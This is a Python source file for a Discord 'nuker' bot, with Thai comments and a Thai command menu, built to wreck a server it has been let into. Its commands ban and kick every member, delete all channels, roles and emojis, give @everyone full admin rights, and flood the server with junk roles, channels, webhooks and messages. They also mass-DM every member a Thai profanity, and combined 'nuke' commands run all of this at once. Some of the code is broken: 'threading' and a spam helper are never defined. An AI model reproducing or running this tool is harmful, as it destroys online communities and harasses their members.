import discord
from discord.ext import commands
from discord.ext.commands import bot
import asyncio
import time
import random
import os
from discord import Permissions
from discord import Webhook, AsyncWebhookAdapter
from colorama import Fore, Style
intents = discord.Intents(messages=True, guilds=True, members=True)
os.system ("clear")



print("""\033[92m╭━━━━┳━━━┳╮╭━┳━━━┳━╮╱╭┳━━╮╭━━━┳━━━━╮
┃╭╮╭╮┃╭━╮┃┃┃╭┫╭━━┫┃╰╮┃┃╭╮┃┃╭━╮┃╭╮╭╮┃
╰╯┃┃╰┫┃╱┃┃╰╯╯┃╰━━┫╭╮╰╯┃╰╯╰┫┃╱┃┣╯┃┃╰╯
╱╱┃┃╱┃┃╱┃┃╭╮┃┃╭━━┫┃╰╮┃┃╭━╮┃┃╱┃┃╱┃┃
╱╱┃┃╱┃╰━╯┃┃┃╰┫╰━━┫┃╱┃┃┃╰━╯┃╰━╯┃╱┃┃
╱╱╰╯╱╰━━━┻╯╰━┻━━━┻╯╱╰━┻━━━┻━━━╯╱╰╯""")



token = input("\033[95m โทเคนบอท : \033[0m")



####คำนำหน้า###
client = commands.Bot(command_prefix="")
####


client.remove_command("help")

os.system ("clear")


@client.event
async def on_ready():
   print(Fore.GREEN + f"{client.user.name}:ล็อกอินสำเร็จ:วิธีใช้ - คำสั่ง\nnukll - เริ่มทั้งหมด (พังเซิฟเล็ก)\nnukell - เริ่มทั้งหมด (พังเซิฟใหญ่)\nkall - เตะสมาชิก\nball - แบนสมาชิก\nadmll - ยศแอดมินทุกคน\nroll - ลบบทบาท\nroell - สแปมบทบาท\nchdll - ลบช่อง\nemoll - ลบอิโมจิ\nwebll - สแปมเว็บฮุก\nspall - สแปมช่อง\npinll - แท็กทุกคน\nunbll - ปลดแบน\nspam - สแปมข้อความ (spam จำนวน ข้อความ)\nnach - เปลี่ยนชื่อช่อง (nach ชื่อ)\nnase - เปลี่ยนชื่อเซิฟ (nase ชื่อ)\nname - เปลี่ยนชื่อสมาชิก (name ชื่อ)\ndmll - ส่งข้อความทุกคนในเซิฟ (dmll ข้อความ")
   await client.change_presence(activity=discord.Game(name="ผมตึง"))



@client.command(pass_context=True)
async def offdata(ctx):
    await ctx.message.delete()
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} ปิดระบบแล้ว." + Fore.RESET)



@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))




##เตะสมาชิก
@client.command(pass_context=True)
async def kall(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.kick(member)
        except:
          pass
##

##แบนสมาชิก
@client.command(pass_context=True)
async def ball(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
        except:
            pass
##

##ยศแอดมินทุกคน
@client.command(pass_context=True)
async def admll(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
    except:
      pass
##

##ลบบทบาท
@client.command(pass_context=True)
async def roll(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for role in guild.roles:
     try:
       await role.delete()
     except:
       pass
##

##สแปมบทบาท
@client.command(pass_context=True)
async def roell(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name="56948132596548751235")
        except:
          pass
##

##ลบช่อง
@client.command(pass_context=True)
async def chdll(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for channel in guild.channels:
      try:
        await channel.delete()
      except:
        pass
###

##ลบอิโมจิ
@client.command(pass_context=True)
async def emoll(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
     except:
       pass
##

##สแปมเว็บฮุก
@client.command(pass_context=True)
async def webll(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0: 
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target = ssspam, args = (webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1

    else:
        webhookamount = 50 / len(ctx.guild.text_channels) 
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):  
        for channel in ctx.guild.text_channels:

            try:
            
                webhook =await channel.create_webhook(name='48516597354685951595')
                threading.Thread(target = ssspam, args = (webhook.url,)).start()
                f = open(r'data/webhooks-'+str(ctx.guild.id)+".txt",'a')
                f.write(f"{webhook.url} \n")
                f.close()

            except:
              pass
##

##สแปมช่อง
@client.command(pass_context=True)
async def spall(ctx):
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="56489523564875165985")
        except:
          pass
##

##แท็กทุกคน
@client.command(pass_context=True)
async def pinll(ctx, *, message=None):
    await ctx.message.delete()
    if len(list(ctx.guild.members)) >= 50:
        userList = list(ctx.guild.members)
        random.shuffle(userList)
        sampling = random.choices(userList, k=50)
        if message is None:
            post_message = ""
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
    else:
        if message is None:
            post_message = ""
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)
##

##ปลดแบน
@client.command(pass_context=True)
async def unbll(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass
##

##สแปมข้อความ ,spam จำนวน ข้อความ
@client.command(pass_context=True)
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)
##

##เปลี่ยนชื่อช่อง ,nach ชื่อ
@client.command(pass_context=True)
async def nach(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        await channel.edit(name=name)
##

##เปลี่ยนชื่อเซิฟ ,nase ชื่อ
@client.command(pass_context=True)
async def nase(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)
##

##เปลี่ยนชื่อสมาชิก ,name ชื่อ
@client.command(pass_context=True)
async def name(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
        except:
          pass
##

##ส่งข้อความส่วนตัว คนในเซิฟเวอร์ dmll ข้อความ
@client.command(pass_context=True)
async def dmll(ctx, *, message:str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
    except:
      pass
##



@client.command(pass_context=True) #พังเซิฟเล็ก
async def nukll(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")    #ยศแอดมิน
      await role.edit(permissions = Permissions.all())
    except:
      pass
    for user in list(ctx.guild.members): #dm
     try:
       await user.send(ddm_spam)
     except:
       pass
       guild = ctx.message.guild
    for role in guild.roles:   #ลบบทบาท
     try:
       await role.delete()
     except:
       pass
       guild = ctx.message.guild
    for emoji in list(ctx.guild.emojis):  #ลบอิโมจิ
     try:
       await emoji.delete()
     except:
       pass
    for _i in range(199):  #สแปมบทบาท
     try:
       guild = ctx.guild
       await guild.create_role(name="486215975325648195762546859231")
     except:
       pass
    for member in list(client.get_all_members()):  #เปลี่ยนชื่อสมาชิก
     try:
       await member.edit(nick=102030405060708090)
     except:
       pass
    for channel in ctx.guild.channels:  #เปลี่ยนชื่อช่อง
     try:
       await channel.edit(name=1)
       await ctx.guild.edit(name=956871351236549876543215513248)#เปลี่ยนชื่อเซิฟ
     except:
       pass
       guild = ctx.message.guild
    for channel in guild.channels:  #ลบช่อง
     try:
       await channel.delete()
     except:
       pass
    guild = ctx.message.guild
    for member in list(client.get_all_members()):  #แบนสมาชิก
     try:
       await guild.ban(member)
     except:
       pass
    await guild.create_text_channel("15935745625824867951")  #สแปมห้องแชท
    for i in range(500):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    return

@client.command(pass_context=True) #พังเซิฟใหญ่
async def nukell(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")    #ยศแอดมิน
      await role.edit(permissions = Permissions.all())
    except:
      pass
      guild = ctx.message.guild
    for role in guild.roles:   #ลบบทบาท
     try:
       await role.delete()
     except:
       pass
       guild = ctx.message.guild
    for emoji in list(ctx.guild.emojis):  #ลบอิโมจิ
     try:
       await emoji.delete()
     except:
       pass
    for _i in range(199):  #สแปมบทบาท
     try:
       guild = ctx.guild
       await guild.create_role(name="486215975325648195762546859231")
     except:
       pass
       guild = ctx.message.guild
    for channel in guild.channels:  #ลบช่อง
     try:
       await channel.delete()
       await ctx.guild.edit(name=956871351236542876543215513248)#เปลี่ยนชื่อเซิฟ
     except:
       pass
    guild = ctx.message.guild
    for member in list(client.get_all_members()):  #แบนสมาชิก
     try:
       await guild.ban(member)
     except:
       pass
    await guild.create_text_channel("15935745625824867951")  #สแปมห้องแชท
    for i in range(500):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    return

    
#############set nuke###########
ddm_spam = [' ควย ']

SPAM_CHANNEL =  ["26431597642319564237","36591258643791568249","96734591672853495426","16583295746589215139","25258695349176528956","32679459156721672529","51919498465998894562","95157132684169512354","23471256745197582865"]

SPAM_MESSAGE = ["@everyone ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|||||||||||| ควย","https://tenor.com/view/explosion-mushroom-cloud-atomic-bomb-bomb-boom-gif-4464831"]
#############
webhook_names = ['54689758632156485216', '95123654789521654895', '85258794623156854978', '52598452131586479512', '12458576591325648585', '23564525231656462354', '51653493243255213532', '97627562723327321977', '85732445978786542312', '11245678546452178786', '46312795462114567495', '64576456723291597465', '13134657249785465472', '95135764645729591576', '62496159721672617532', '34619767525374267794', '12567854321787895445','54895231564964896456', '34646113166135644613','21948654131648975356', '46841321897564891906','86767454687456564243', '22346219783754764658','33376249555755555678', '99999546756734256444','33567249995756422858', '33346175279545798758']

message_spam = ['@everyone ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|||||||||||| ควย']





@client.event
async def on_guild_channel_create(channel): #สแปมข้อความ
  while True:
        await channel.send(random.choice(SPAM_MESSAGE))




@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
  while True:  
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))










client.run(token)